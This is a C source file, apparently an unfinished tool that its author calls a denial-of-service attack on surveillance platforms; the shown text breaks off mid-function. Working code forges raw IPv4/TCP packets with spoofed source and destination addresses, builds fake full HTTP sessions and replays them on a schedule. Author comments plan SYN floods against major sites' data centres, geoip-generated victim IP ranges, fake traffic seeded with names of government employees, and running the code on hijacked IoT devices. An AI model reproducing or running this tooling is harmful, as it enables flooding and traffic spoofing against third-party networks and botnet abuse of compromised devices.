/*

this is the main file which takes care of DoS against surveillance platforms worldwide
it is meant to exhaust CPU, memory, and possibly pipes/linked relationships... it will be
three staged (released/versioned) ... first is just to stop connections from being monitored
then itll go further (due to the possible ways to fix that issue) although i plan to release
all possible scenarios as soon as possible.. in other words: plan for every possible fix...
since these hackish systems use fiber taps etc then there will always be a way to disrupt them
and as long as this code continously runs on several machines then ... no more surveillance

*/

/*
discovery:
all major sites (prism related, facebook, those kinds) in a list
DNS them all.. and begin to reverse their ranges, and analyze traceroutes to find ones with same hops
to ensure its either in the same datacenter, or closse to it

for DNS it should randomize between google, and other top providers an dthe local provider (it can attempt to DNS fromm all
local hosts as a third of its requests)

generate residential IPs using geoip

generate business IPs using geoip (and a list of worldwide isp providers)

https://www.maxmind.com/en/geoip2-isp-database - $100 for all business ip ranges...
perfect for this.


https://www.maxmind.com/en/geoip2-enterprise-database - even better...
covers all non residential

IANA/whois info could be used (but dont put code to look anything up)

attack:

stage 0-1: IPv6 support... can reuse the same logic structures.. it shouldnt be hard to add...
the main concern iss the IP ranges (harder to scan) but DNS, etc and the same research mechaniss will work
i just dont know if geoip works the same


stsage 1 - syn (not virtual connections) floods using alll of the ranges (but we can virtualize a respoonse from the server
so that it takes up a structure inside of the surveillance platforms)
their first response will be to count a few packets such as 5 before it prioritizes so this should be variable and increase over time
(increase suuch as falsifying more packets per connection as months go on fromm release)

stage 2-  full blown requests using either local network information regarding top sites (non ssl) but with macros being used
to replace information... most used names can be found easily to be integrated for most languages online (top birth names in countries)
and then terrorists, or lists of government employees either captured from www or local network (libpcaap on these routers since its ioT)
could be used to create automatic local lists of macro replacements for the falsifyed connections


stage 3- doing separate sides of the session using multiple hosts across the globe guaranteed to ensure it is son both sides of the tap
this is the LAST possible way that the surveillance platforms can attempt to detect the situations..
and ...its going to be SO CPU intensive, and annoying due to BGP routing and many other factors.. think multicast, anycast,
and just protocol gibberish... yeah.. but itll be prepared anyhow.


------
at some stage the surveillance systems are going to start randomly accepting connections by some % and only adding them to a permanent
list if they contain actionable intelligence which means that if you declare enough real connections (full sessions) captured and replayed
to autheticate host/ips then it will begin to delegate the falsified ones as well

icmpp messages such as redirect and host not available, ad port not available could also affect these serviecs

-----

*/
/*
geoip [ 

    residential finder - generate & verify IPs within particular countries (first world, high intelligene gathering, etc)

    business IP finders - generate & verify ips in certain industries.. whois/http/dns (dfense, cyber, ads, etc)

    corporate discovery - generate ips for facebook, google, microsoft, etc (all past prism/major online resources, and expected ones now)
    (top few thousands websites should be enough)
]

geoip = 6megs default

posssible to extract top countries out of the database and use solely those.. it should lower it to below a megabyte
and using our own algorithm would help even further



dns (host -t MX, NS, etc) for top sites (to generate enough connections to overrun their capturing scenarios for mail,etc)



traceroute (to ensure it goes through enough hops for the hosts that were generated) which meaans itll pass through the fiber
needss to vereify both sides, source and dest.. then 1 single box can attack and due to rouutinng, bgp and world wide
itll work just as fine as having two boxes working together on other parts of the world

picking hosts near the dest/source host might be smart as well..to ensure it doesnt give away information to these systems
in case they use this tracing scenario to attempt to block or mitigate these attackers


list of protocols
http smtp pop ssl vpn smtp ssh dns (each need to be equally hit to ensure it funnctions for all NSA selectors fromm leaks)

packet generators (lots around)
syn flood, virtual tcp connections (much eaier now that we do not need both sides of the tap)


----
emulation of some packet loss at times may be smart to implement especially over lots of connections (if a score base system
isnt sure then havinng somme situations like this only helps)



*/

#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <getopt.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <stdint.h>
#include <time.h>
#include <string.h>
#include <fcntl.h>
#include <resolv.h>
#include <sys/stat.h>
//#include "structs.h"
//#include <list.h>
//#include "utils.h"
#include "anti_surveillance.h"


#define min(a,b) ((a) < (b) ? (a) : (b))



#define TEST

#ifdef TEST
#include <linux/if_ether.h>
#include <net/ethernet.h>
#endif

typedef struct _link { struct _link *next; } LINK;

int L_count(LINK *ele) {
    int count = 0;
    
    while (ele != NULL) {
      count++;
      ele = ele->next;
    }
    
    return count;
  }

  

LINK *L_last(LINK *list) {
    while (list->next != NULL) {
      list = list->next;
    }
    
    return list;
  }
  
// order the linking (so its FIFO) instead of LIFO
void L_link_ordered(LINK **list, LINK *ele) {
    LINK *_last = NULL;
    
    if (*list == NULL) {
      *list = ele;
      return;
    }
    
    _last = L_last(*list);
    _last->next = ele;
  }

  
  
// declarations
unsigned short in_cksum(unsigned short *addr,int len);
void AttackFreeStructures(AS_attacks *aptr);



// queue for futher requests to the DNS lookup which will populate IPs for major sites, and corporations
// it should find mail servers, name servers, and other IPs related to these companies which  are different
// from the front facing sites
// it should also allow a spider once these ips are done being used or increase (over months or time) to automatically
// spider the IPs, and reverse then continue adding all ranges/data centers related
// this would allow the software to adapt to how governments will begin to block this attack
// depending on intelligence lost they may attempt to block quickly but id expect it shoud increase by 3-6months
// for spidering all geoip data centers for every major site

// thiis should also lookup residential IPs generated in countries using geoip...
// this information should be cached so the same IoT bot doesnt have to continously look it up
// a system for distributing over p2p could work for this as well but it should verify 10% and immediately
// disqualify p2p if it finds someone is attempting to infect it wiith bad information
// inn that case, they could all scan IPv4 ranges for open DNS servers (simple to do) and then
// share sevveral, or find their own and attempt to get real results

// also it could automaticallly scan and find dns servers in geoip regions to ensure it obtains the correct data centers
// for appllying the attack to that region

enum {
        // can auto append www. to most just to grab that
        DNS_WWW,
        DNS_MX,
        DNS_NS,
        DNS_A,
        DNS_PTR    
};


// queued dns requests (getting prepared to go to wire)
DNSQueue *dns_queue = NULL;

// responsses from DNS requests which can be used for future attacks on particular sites such as facebook, etc
DNSRecord *dns_records = NULL;


// dns (MX, NS, PTR, etc)
//https://stackoverflow.com/questions/1093410/pulling-mx-record-from-dns-server
// ensure it works across all IoT and systems
/*
int DNS_lookup(DNSQueue *qptr) {
    u_char nsbuf[4096];
    char dispbuf[4096];
    ns_msg msg;
    ns_rr rr;
    int i = 0, j = 0, l = 0;

    if (qptr == NULL) return -1;

#ifndef PQUERY
    l = res_query (qptr->hostname, ns_c_any, ns_t_mx, nsbuf, sizeof (nsbuf));
#else
// found this in orig function.. check both...
    res_pquery (&_res, nsbuf, l, stdout);
#endif
    ns_initparse (nsbuf, l, &msg);
    l = ns_msg_count (msg, ns_s_an);
    for (j = 0; j < l; j++) {
        ns_parserr (&msg, ns_s_an, j, &rr);
        ns_sprintrr (&msg, &rr, NULL, NULL, dispbuf, sizeof (dispbuf));
        printf ("%s\n", dispbuf);
    }

    return 1;
}*/


ResearchInfo *research_list = NULL;
AS_attacks *attack_list = NULL;


// this is flushed to wire as quickly as possible...
// this allows using a separate thread to ensure speed is fast enough
// in that case we shouldnt affect the attack_info from another thread
// without mutex, etc but it might not be worth it
AttackOutgoingQueue *network_queue = NULL;


/*

this will put a packet (needs eth frame for this operation) directly into outgoing queue
ok so one thing to consider in the future
its possible that 2 packets of the same attack get sent too close together... itd be nice to have them separated by frames
it might be smart to use an array when adding where one outgoing queue will move the next one into the current positon after
it flushes hte buffer.. for now i wont deal with it... but it can either be done by
adding a variable with a wait count (one loop each decrement) before it sends the packet so it can
queue future packets which wonot get sent till next iteratioon.. ill work this out in a bit
i dont think its important until the analysis parts of attempting to block the attacks come into pllay
ive pretty much thought of every possible way to fix all of these attacks, and ... its impossible to solve for good.

*/
int AS_queue(AS_attacks *attack, PacketInfo *qptr) {
    AttackOutgoingQueue *optr = NULL;

    if ((optr = (AttackOutgoingQueue *)calloc(1,sizeof(AttackOutgoingQueue))) == NULL) {
        return -1;
    }
    // we pass the pointer so its not going to use CPU usage to copy it again...
    // the calling function should release the pointer (set to NULL) so that it doesnt
    // free it too early
    optr->buf = qptr->buf;
    qptr->buf = NULL;

    optr->size = qptr->size;
    qptr->size = 0;

    optr->attack_info = attack;

    // link to outgoing queue (FIFO)
    L_link_ordered((LINK **)&network_queue, (LINK *)optr);

    return 1;
}


// *** strategy for repeat_interval needs to be worked into an algorithm taking considering of how long this system is released
// it needs to progressively use more resources over time
// this isnt just for a simple SYN (one packet trying to open a port)
// depth will allow to go the entire handshake... 
// the point is initially that the systems wont be prepared for these kinds of attacks...
// but a start date will get put in (prob nov 4-5) which will be the date fromm when the depth will be calculated
// after full connectioons are established (depth = 3) then it will rely on virtual connections as well
// **
// so do we generate session pacets into an array.. and then push to this function??
//.....

int AS_session_queue(int id, uint32_t src, uint32_t dst, int src_port, int dst_port, int count, int interval, int depth) {
    AS_attacks *aptr = NULL;

    aptr = (AS_attacks *)calloc(1, sizeof(AS_attacks));
    if (aptr == NULL)
        return -1;

    // identifier for the attack..
    // in case we need to find it in queue later
    aptr->id = id;

    // src&dst information
    aptr->src = src;
    aptr->dst = dst;
    aptr->source_port = src_port;
    aptr->destination_port = dst_port;

    // this is a full blown tcp session
    aptr->type = ATTACK_SESSION;

    // how many times will we replay this session?
    aptr->count = count;
    // how much time in between each replay?
    aptr->repeat_interval = interval;

    // FIFO - first in first out...
    L_link_ordered((LINK **)&attack_list, (LINK *)aptr);

    return 1;
}

// thiis is going to be an entire new category.. poossibly with scripting languages to call lua, python, or other scripts
// or grab data remotely for creatinng conversatioons over time being pushed into these surveillance platforms
// full manipulation... like i said nsa aint ready
// this needs to be paired diretly with AS_session_queue() and other possible queues...
// for some people we wanna perform full blown emulation from DNS (with correct TTL) to third party browser connections
// to fake SSL, or possibly replaying some other SSL, or generating some SSL connections remotely, or locally for this
// by means of openssl etc
// it really  wont take much.. one line at a time and soon everything will make sense.
// there will be ZERO way to block this whenever its completed.
// **** linkk this directly to botlink....
void PacketAdjustments(AS_attacks *aptr) {
    // our new source port must be above 1024 and below 65536
    // lets get this correct for each emulated operating system later as well
    int client_port = (1024 + rand()%(65535 - 1024));
    int client_identifier = rand()%0xFFFFFFFF;
    int server_identifier = rand()%0xFFFFFFFF;

    PacketBuildInstructions *buildptr = aptr->packet_build_instructions;

    while (buildptr != NULL) {

        // set ports for correct side of the packet..
        if (buildptr->client) {
            // coming from client to server..
            // we must change source ports absolutely for all sessions
            buildptr->source_port = client_port;
            buildptr->header_identifier = client_identifier++;
        } else  {
            // coming from server
            buildptr->destination_port = client_port;
            buildptr->header_identifier = server_identifier++;
        }

        buildptr = buildptr->next;
    }

    BuildPackets(aptr);
    
    return;
}


void PacketQueue(AS_attacks *aptr) {
    int ts = time(0);
    PacketInfo *pkt = NULL;

    // if its already finished.. lets just move forward
    if (aptr->completed) return;

    // onoe of these two cases are correct fromm the calling function
    if (aptr->current_packet != NULL)
        pkt = aptr->current_packet;
    else {
        // we do have to reprocess these packets fromm packet #1?
        if (aptr->count == 0) {
            // lets free the packets....we dont have anymore times to push to wire...
            PacketsFree(&aptr->packets);
    
            aptr->current_packet = NULL;
            aptr->packets = NULL;
            aptr->completed = 1;
    
            return;
        }
        // lets start it over..
        pkt = aptr->packets;        
    }

    if (pkt == NULL) {
        // error shouldnt be here...
        aptr->completed = 1;

        return;
    }
    // is it the first packet?
    if (pkt == aptr->packets) {
        // by here we have more counts to start this session over.. lets ensure its within the time frame we set
        // remember on the first time.. the ts is 0 so this will never mistake that it hasnt been enough time
        // subtracting 0 from epoch
        if ((ts - aptr->ts) < aptr->repeat_interval) {
            // we are on the first packet and it has NOT been long enough...
            return;
        }
        // derement the count..
        aptr->count--;

        // later.. sinnce this is the first packet.. we need to allow modifications using particular ranges (such as source ports, etc)
        // it would go here.. :) so it can modify quickly before bufferinng againn... IE: lots of messages to social sites, or blogs..
        // could insert different messages here into the session and prepare it right before the particular connection gets pushed out

        // small logic bug here for the momment.. its adjusting and doing two sets of packets (diff source numbers, so the adjustments work properly
        // for falsifying thousaands of connections from a single attack body.. glad that works) but for testing i just see 20 packets instead of 10
        // will figure it out tomoorrow.. noothing serious.
        PacketAdjustments(aptr);
        // if it failed itll show as completed...
        if (aptr->completed) return;
    } else {
        // we arent the first packet.. lets be sure we dont have to wait some amount of time before
        // sending the next packet
        if ((ts - aptr->ts) < pkt->wait_time) {
            // the next packet needs more time before being sent
            return;
        } 
    }

    // queue this packet (first, or next) into the outgoing buffer set...
    // it uses the same pointer from pkt so it doesnt copy again...
    // expect it removed after this..
    AS_queue(aptr, pkt);

    // lets prepare the next packet (if it exists.. otherise itll complete)
    aptr->current_packet = pkt->next;

    // we set the ts to the time of the last packet submission.. this way the separation is by the messages being completed..
    // this can allow full blown  simulated conversations being pushed directly into intelligence platforms to manipulate them
    // ie: generate text, neural network verify it seems human vs not, then randomly choose whne the two parties would be online together,
    // or not.. it can keep context information about parties (even possibly transmitted over p2p to keep on somme remote server for IoT hacked devices
    // to reload..)
    // this could allow using simulated messages where two parties arent even online at the same time but send small messages...
    // all of this couldd be trained, automated and directed to fconfuse manipulate or disrupt intelligence platforms...
    // thats why this timestamp is extremely impoortant ;)
    aptr->ts = ts;

    return;
}

void PacketsFree(PacketInfo **packets) {
    PacketInfo *ptr = NULL, *pnext = NULL;

    // verify there are packets there to begin with
    if ((ptr = *packets) == NULL) return;

    // free all packets
    while (ptr != NULL) {
        // once AS_queue() executes on this.. it moves the pointer over
        // so it wont need to be freed from here (itll happen when outgoing buffer flushes)
        PtrFree(&ptr->buf);

        // keep track of the next, then free the current..
        pnext = ptr->next;
        free(ptr);

        // now use that pointer to move forward..
        ptr = pnext;
        continue;
    }

    // no more packets left... so lets ensure it doesn't get double freed
    *packets = NULL;

    return;
}

// remove completed sessions
void AS_remove_completed() {
    AS_attacks *aptr = attack_list, *anext = NULL;

    while (aptr != NULL) {
        if (aptr->completed == 1) {
            // we arent using a normal for loop because
            // it'd have an issue with ->next after free
            anext = aptr->next;

            // free all packets from this attack structure..
            AttackFreeStructures(aptr);

            // free the structure itself
            free(aptr);

            if (attack_list == aptr) attack_list = anext;
            aptr = anext;

            continue;
        }

        aptr = aptr->next;
    }

    return;
}

// perform one iteration of each attack
int AS_perform() {
    AS_attacks *aptr = attack_list;
    attack_func func;
    
    while (aptr != NULL) {
        if (aptr->completed == 0) {
            // if we dont have any prepared packets.. lets run the function for this attack
            if (aptr->packets == NULL) {
                // call the correct function for performing this attack to build packets.. it could be the first, or some adoption function decided to clear the packets
                // to call the function again
                func = (attack_func)aptr->function;
                if (func != NULL)
                    (*func)(aptr);
                //aptr->attack_func(aptr);
            }

            // if we have packets queued.. lets handle it.. logic moved there..
            if ((aptr->current_packet != NULL) || (aptr->packets != NULL)) {
                PacketQueue(aptr);
            } else {
                aptr->completed = 1;
            }
        }
        aptr = aptr->next;
    }
    // every loop lets remove completed sessions... we could choose to perform this every X iterations, or seconds
    // to increase speed at times.. depending on queue, etc
    AS_remove_completed();

    return 1;
}


/* took some packet forging stuff I found online, and modified it...
   It was better than my wireshark -> C array dumping w memcpy... trying to hack this together as quickly as possible isnt fun :)

   /*!	forgetcp.c
 * 	\Brief Generate TCP packets
 * 	\Author jve
 * 	\Date  sept. 2008
*/


void PtrFree(char **ptr) {
    if (*ptr) free(*ptr);
    *ptr = NULL;
}

void PacketBuildInstructionsFree(AS_attacks *aptr) {
    PacketBuildInstructions *iptr = aptr->packet_build_instructions;

    while (iptr != NULL) {

        PtrFree(&iptr->data);
        iptr->data_size = 0;

        PtrFree(&iptr->packet);
        iptr->packet_size = 0;

        PtrFree(&iptr->options);
        iptr->options_size = 0;

        iptr = iptr->next;
    }

    aptr->packet_build_instructions = NULL;

    return;
}

void AttackFreeStructures(AS_attacks *aptr) {
    // free build instructions
    PacketBuildInstructionsFree(aptr);

    // free packets already prepared in final outgoing structure for AS_queue()
    PacketsFree(&aptr->packets);
}

// build packets relating to a set of instructions being passed
// fromm somme other function which generated the session(s)
void BuildPackets(AS_attacks *aptr) {
    int bad = 0;
    PacketBuildInstructions *ptr = aptr->packet_build_instructions;
    PacketInfo *qptr = NULL;

    // all packets must be rebuilt.. so free old ones which were already queued

    //PacketsFree(&aptr->packets);
    //aptr->current_packet = NULL;


    if (ptr == NULL) {
        aptr->completed = 1;
        return;
    }
    while (ptr != NULL) {
        // rebuild options for the tcp packets now.. will require changes such as timestamps
        // to correctly emulate operating systems
        if (ptr->flags & TCP_OPTIONS) {
            if (PacketBuildOptions(ptr) != 1) {
                aptr->completed = 1;
                return;
            }
        }
        if (BuildSinglePacket(ptr) == 1) {
            ptr->ok = 1;
        } else {
            bad = 1;
            break;
        }

        if (ptr->packet == NULL || ptr->packet_size <= 0) {
            // something went wrong.
            bad = 1;
            
            break;
        }

        ptr = ptr->next;
    }
    // if something went wrong.. lets free all packets & mark attack closed
    if (bad == 1) {
        AttackFreeStructures(aptr);
        
        aptr->completed = 1;
        
        return;
    }
    // all packets should be OK.. lets put them into a final staging area...
    // this mightt be possible to remove.. but i wanted to give some room for additional
    // protocols later.. so i decided to keep for now...
    // besides this will all run distributed.. id optimize if you wanna spit this out on fiber lines
    // maybe ill get bored one night and optimizze for maxximum pps.. but..
    // i dont think itll even be necessary ;)
    ptr = aptr->packet_build_instructions;
    while (ptr != NULL) {
        qptr = (PacketInfo *)calloc(1, sizeof(PacketInfo));
        if (qptr == NULL) {
            bad = 1;
            break;
        }

        qptr->buf = ptr->packet;
        qptr->size = ptr->packet_size;
        
        // lets emulate wait times in the future (and turn to microsecondss from seconds)
        qptr->wait_time = 0;

        // so we dont double free.. lets just keep in the new structure..
        // again i might remove this later... but wanted some room for other upgrades
        // i dont wish to discuss yet ;)
        ptr->packet = NULL;
        ptr->packet_size = 0;

        // link FIFO into the attack structure
        L_link_ordered((LINK **)&aptr->packets, (LINK *)qptr);

        ptr = ptr->next;
    }

    if (bad == 1) {
        AttackFreeStructures(aptr);
        
        aptr->completed = 1;
    }
    return;
}


//https://tools.ietf.org/html/rfc1323
int PacketBuildOptions(PacketBuildInstructions *iptr) {
    // need to see what kind of packet by the flags....
    // then determine which options are necessaray...
    // low packet id (fromm 0 being syn connection) would require the tcp window size, etc

    // options are here static.. i need to begin to generate the timestamp because that can be used by surveillance platforms
    // to attempt to weed out fabricated connections ;) i disabled it to grab this raw array
    unsigned char options[12] = {0x02, 0x04, 0x05, 0xb4, 0x01, 0x01, 0x04, 0x02, 0x01, 0x03,0x03, 0x07};
    // this is preparing for when we have dynamic options...
    char *current_options = NULL;

    int current_options_size = 12;

    /*
    if (iptr->flags & TCP_OPTIONS_TIMESTAMP) {
        current_options_size += 8;
        // generate new options.. into current_options[_size]
    }*/


    current_options = (char *)calloc(1, current_options_size);
    if (current_options == NULL) return -1;

    PtrFree(&iptr->options);

    // *** generate options using flags.. timestamp+window size
    // until we generate using flags...
    memcpy(current_options, options, 12);

    iptr->options_size = current_options_size;
    iptr->options = current_options;

    return 1;
}




int BuildSinglePacket(PacketBuildInstructions *iptr) {
    int ret = -1;
    int TCPHSIZE = 20;

    iptr->tcp_window_size = 1500;

    if (iptr->options_size) TCPHSIZE += iptr->options_size;
    // calculate full length of packet.. before we allocate memory for storage
    int final_packet_size = IPHSIZE + TCPHSIZE + iptr->data_size;

    unsigned char *final_packet = (unsigned char *)calloc(1, final_packet_size);
    struct packet *p = (struct packet *)final_packet;

    // there should be a glboal function for memory issue ...
    // it should cleanup (as much as possible) and exit
    if (final_packet == NULL) return ret;

    // ip header.. 
    p->ip.version 	= 4;
    p->ip.ihl 	= IPHSIZE >> 2;
    p->ip.tos 	= 0;
    
    // thiis id gets incremented similar to ack/seq (look into further later)
    // it must function properly like operating systems (windows/linux emulation needed)
    // itll take weeks or months to updaate systems to actually search for this and determine differences
    // and thats IF its even possible (due to their implementation having so much more data
    // than possible to log... it must make decisions extremely fast)  ;) NSA aint ready.
    p->ip.id 	= htons(iptr->header_identifier);

    // this can also be used to target the packets... maybe changee options per machine, or randomly after X time
    // i believe this is ok.. maybe allow modifying it laater so operting  system profiles could be used
    p->ip.frag_off 	= 0x0040;
    
    p->ip.ttl 	= iptr->ttl;
    p->ip.protocol 	= IPPROTO_TCP;
    p->ip.saddr 	= iptr->source_ip;
    p->ip.daddr 	= iptr->destination_ip;

    // tcp header
    // we want a function to build our ack seq.. it must seem semi-decent entropy.. its another area which
    // can be used later (with a small.. hundred thousand or so array of previous ones to detect entropy kindaa fast
    // to attempt to dissolve issues this system will cause.. like i said ive thought of all possibilities..)
    // ***
    p->tcp.seq = htonl(iptr->seq);
    p->tcp.ack_seq	= htonl(iptr->ack);
    p->tcp.urg	= 0;
    
    // syn/ack used the most
    p->tcp.syn	= (iptr->flags & TCP_FLAG_SYN) ? 1 : 0;
    p->tcp.ack	= (iptr->flags & TCP_FLAG_ACK) ? 1 : 0;

    // push so far gets used when connection gets established fromo sserver to source
    p->tcp.psh	= (iptr->flags & TCP_FLAG_PSH) ? 1 : 0;
    // fin and rst are ending flags...
    p->tcp.fin	= (iptr->flags & TCP_FLAG_FIN) ? 1 : 0;
    p->tcp.rst	= (iptr->flags & TCP_FLAG_RST) ? 1 : 0;

    // window needs to also be dynamic with most used variables for operating systems...
    // it should have a dynamic changing mechanism (15-30% for each, and then remove, or add 3-5% every few minutes)
    p->tcp.window	= htons(iptr->tcp_window_size);
    
    p->tcp.check	= 0;	/*! set to 0 for later computing */
    
    p->tcp.urg_ptr	= 0;
    
    p->tcp.source = htons(iptr->source_port);
    p->tcp.dest = htons(iptr->destination_port);

    // total length
    p->ip.tot_len = htons(final_packet_size);

    // these must be in order before the instructions are sent to this function
    //p->tcp.seq = htonl(iptr->seq);
    //p->tcp.ack = htonl(iptr->ack);


    p->tcp.doff 	= TCPHSIZE >> 2;

    // ip header checksum
    p->ip.check	= (unsigned short)in_cksum((unsigned short *)&p->ip, IPHSIZE);

    // tcp header checksum
    if (p->tcp.check == 0) {
        /*! pseudo tcp header for the checksum computation
            */
        char *checkbuf = NULL;
        struct pseudo_tcp *p_tcp = NULL;
        checkbuf = (char *)calloc(1,sizeof(struct pseudo_tcp) + TCPHSIZE + iptr->data_size);
        if (checkbuf == NULL) {
            // *** error correctly here...
            return -1;
        }
        p_tcp = (struct pseudo_tcp *)checkbuf;

        p_tcp->saddr 	= p->ip.saddr;
        p_tcp->daddr 	= p->ip.daddr;
        p_tcp->mbz 	= 0;
        p_tcp->ptcl 	= IPPROTO_TCP;
        p_tcp->tcpl 	= htons(TCPHSIZE + iptr->data_size);
        //memcpy(&p_tcp->tcp, &p->tcp, TCPHSIZE);
        memcpy(&p_tcp->tcp, &p->tcp, TCPHSIZE);
        memcpy(checkbuf + sizeof(struct pseudo_tcp),
            iptr->options, iptr->options_size);
        memcpy(checkbuf + sizeof(struct pseudo_tcp) + iptr->options_size,
        iptr->data, iptr->data_size);        
        

        /*! compute the tcp checksum
            *
            * TCPHSIZE is the size of the tcp header
            * PSEUDOTCPHSIZE is the size of the pseudo tcp header
            */
        p->tcp.check = (unsigned short)in_cksum((unsigned short *)checkbuf, TCPHSIZE + PSEUDOTCPHSIZE + iptr->data_size + iptr->options_size);

        free(checkbuf);
    }

    // prepare the final packet buffer which will go out to the wire
    memcpy(final_packet, p, sizeof(struct packet));

    if (iptr->options_size)
        memcpy(final_packet + sizeof(struct packet), iptr->options, iptr->options_size);

    memcpy(final_packet + sizeof(struct packet) + iptr->options_size, iptr->data, iptr->data_size);
    

    iptr->packet = (char *)final_packet;
    iptr->packet_size = final_packet_size;

    // we need too keep track of whch packet number thi is for which session
    // to help do certaini things like ack/seq, modify later,, etc

    // so iptr->ok gets set...
    return (ret = 1);
}


// calculate checksum
unsigned short in_cksum(unsigned short *addr,int len) {
	register int sum = 0;
	u_short answer = 0;
	register u_short *w = addr;
	register int nleft = len;

        /*!
	* Our algorithm is simple, using a 32 bit accumulator (sum), we add
	* sequential 16 bit words to it, and at the end, fold back all the
	* carry bits from the top 16 bits into the lower 16 bits.
	*/
	while (nleft > 1)  {
		sum += *w++;
		nleft -= 2;
	}

	/*! mop up an odd byte, if necessary */
	if (nleft == 1) {
		*(u_char *)(&answer) = *(u_char *)w ;
		sum += answer;
	}

	/*! add back carry outs from top 16 bits to low 16 bits */
	sum = (sum >> 16) + (sum & 0xffff);     /*! add hi 16 to low 16 */
	sum += (sum >> 16);                     /*! add carry */
	answer = ~sum;                          /*! truncate to 16 bits */
	return(answer);
}


PacketBuildInstructions *BuildInstructionsNew(PacketBuildInstructions **list, uint32_t source_ip, uint32_t destination_ip, int source_port, int dst_port, int flags, int ttl) {
    PacketBuildInstructions *bptr = NULL;

    bptr = (PacketBuildInstructions *)calloc(1, sizeof(PacketBuildInstructions));
    if (bptr == NULL) return NULL;

    bptr->source_ip = source_ip;
    bptr->source_port = source_port;

    bptr->destination_ip = destination_ip;
    bptr->destination_port = dst_port;

    bptr->flags = flags;
    bptr->ttl = ttl;

    L_link_ordered((LINK **)list, (LINK *)bptr);

    return bptr;
}

int DataPrepare(char **data, char *ptr, int size) {
    char *buf = (char *)calloc(1, size);
    if (buf == NULL) return -1;

    memcpy(buf, ptr, size);
    *data = buf;

    return 1;
}



// create build instructions surrounding an http session.. and the client body/server response..
// these instructions are the 'over view' of generating the fake tcp session..
// the instructions are for the low level IP4/TCP packet generator
// *** add ipv6 support here.. and have a diff backend generator for low level

// this should handle all prepearations for emulation of OS, etc
// we allow server port in case we wanna emulate SSL cocnnections on port 443..
// its jusst as easy.. just need the SSL information innside of the bodies the same..
// its possible it requires a couple extra packets in between but ill keep it here for now..
// later ill spllit up the bodies into arrays which wouldd allow it to work across both protocols easily..
// its few minute change that yo caan handle yourself.. itll be awhile before it depends on SSL to fuck shit up

// to do: support pipelining.. but in reality... it just requires an array like SSL, with a loop...
// the differences is that it will begin the seconodary client & server request using older ACK/SEQ inistead of
// closing connections..

// later we can emulate some packet loss in here.. its just  random()%100 < some percentage..
// with a loop resending the packet.. super simple to handle.  we can also falsify other scenarios
// involving ICMP etc.. some very nasty tricks coming.  
int GenerateBuildInstructionsHTTP(AS_attacks *aptr, uint32_t server_ip, uint32_t client_ip, uint32_t server_port,  char *client_body,  int client_size, char *server_body, int server_size) {
    PacketBuildInstructions *bptr = NULL;
    PacketBuildInstructions *build_list = NULL;

    // decide OS later..
    int client_emulation = 0;
    int server_emulation = 0;

    // what do we need for building all packets?
    int packet_size = 0;
    // for SYN,ACK,FIN,etc... up to OPTIONS(timestamp+window size)
    int packet_flags = 0;
    // packet time to live
    int packet_ttl = 64;

    char *client_body_ptr = client_body;
    char *server_body_ptr = server_body;

    // these are in headers.. and seems to be +1 fromm start..
    // we need to get more requests for when they begin to *attempt* to filter these out..
    // good luck with that.
    uint32_t client_identifier = rand()%0xFFFFFFFF;
    uint32_t server_identifier = rand()%0xFFFFFFFF;

    // os emulation and general statistics required here from operating systems, etc..
    //// find correct MTU, subtract headers.. calculate.
    // this is the max size of each packet while sending the bodies...
    int max_packet_size_client = 1500; 
    int max_packet_size_server = 1500; 

    int client_port = 1024 + (rand()%(65535-1024));

    uint32_t client_seq = 100;
    uint32_t server_seq = 500;

    // info on ack/seq: http://packetlife.net/blog/2010/jun/7/understanding-tcp-sequence-acknowledgment-numbers/
    // inc +1 on SYN,FIN otherwise just data size..

    // first we need to generate a connection syn packet..
    packet_flags = TCP_FLAG_SYN|TCP_OPTIONS|TCP_OPTIONS_TIMESTAMP|TCP_OPTIONS_WINDOW;
    packet_ttl = 64;
    if ((bptr = BuildInstructionsNew(&build_list, client_ip, server_ip, client_port, server_port, packet_flags, packet_ttl)) == NULL) goto err;
    bptr->header_identifier = client_identifier++;
    bptr->client = 1; // so it can generate source port again later... for pushing same messages w out full reconstruction
    bptr->ack = 0;
    bptr->seq = client_seq++;  

    // then nthe server needs to respond acknowledgng it
    packet_flags = TCP_FLAG_SYN|TCP_FLAG_ACK|TCP_OPTIONS|TCP_OPTIONS_TIMESTAMP|TCP_OPTIONS_WINDOW;
    packet_ttl = 53;
    if ((bptr = BuildInstructionsNew(&build_list, server_ip, client_ip, server_port, client_port, packet_flags, packet_ttl)) == NULL) goto err;
    bptr->header_identifier = server_identifier++;
    bptr->ack = client_seq;
    bptr->seq = server_seq++;

    // then the client must respond acknowledging that servers response..
    packet_flags = TCP_FLAG_ACK|TCP_OPTIONS|TCP_OPTIONS_TIMESTAMP;
    packet_ttl = 64;
    if ((bptr = BuildInstructionsNew(&build_list, client_ip, server_ip, client_port, server_port, packet_flags, packet_ttl)) == NULL) goto err;
    bptr->header_identifier = client_identifier++;
    bptr->client = 1;
    bptr->ack = server_seq;
    bptr->seq = client_seq;


    // now the client must loop until it sends all daata
    while (client_size > 0) {

        packet_size = min(client_size, max_packet_size_client);

        // the client sends its request... split into packets..
        packet_flags = TCP_FLAG_PSH|TCP_FLAG_ACK|TCP_OPTIONS|TCP_OPTIONS_TIMESTAMP;
        packet_ttl = 64;
        if ((bptr = BuildInstructionsNew(&build_list, client_ip, server_ip, client_port, server_port, packet_flags, packet_ttl)) == NULL) goto err;
        if (DataPrepare(&bptr->data, client_body_ptr, packet_size) != 1) goto err;
        bptr->data_size = packet_size;
        bptr->header_identifier = client_identifier++;
        bptr->client = 1;
        bptr->ack = server_seq;
        bptr->seq = client_seq;
    
        client_seq += packet_size;

        client_size -= packet_size;
        client_body_ptr += packet_size;

        // server sends ACK packet for this packet
        packet_flags = TCP_FLAG_ACK|TCP_OPTIONS|TCP_OPTIONS_TIMESTAMP;
        packet_ttl = 53;
        if ((bptr = BuildInstructionsNew(&build_list, server_ip, client_ip, server_port, client_port, packet_flags, packet_ttl)) == NULL) goto err;
        bptr->header_identifier = server_identifier++;
        bptr->ack = client_seq;
        bptr->seq = server_seq;

    }

    // noow the server must loop until it sends the client all data
    while (server_size > 0) {

        packet_size = min(server_size, max_packet_size_client);
        
        // the server sends the client a data packet
